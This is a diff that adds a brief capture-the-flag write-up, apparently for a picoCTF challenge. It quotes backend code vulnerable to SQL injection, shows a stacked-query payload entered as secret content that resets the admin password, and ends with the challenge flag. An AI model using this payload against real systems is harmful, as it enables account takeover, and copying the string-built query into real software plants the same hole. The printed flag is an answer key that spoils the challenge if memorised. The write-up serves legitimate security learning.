@@ -1,0 +1,23 @@
+Looking at the source code, we have an SQL injection opportunity when creating a new secret
+
+```
+const query = await db.raw(
+    `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
+);
+```
+
+Injecting into the INSERT statement isn't immediately straightforward to me, so instead let's add a second statement to the query
+that updates the admin password to something we know.
+
+To do this, we create a secret with the following content:
+```
+'); UPDATE users SET password = 'test' WHERE username = 'admin'; --
+```
+
+which transforms the query executed by the backend to:
+```
+INSERT INTO secrets(owner_id, content) VALUES ('...', ''); UPDATE users SET password = 'test' WHERE username = 'admin'; --')
+```
+
+Once the secret is created we can log in as the admin and see the flag:
+picoCTF{sq1_1nject10n_31c1577b}
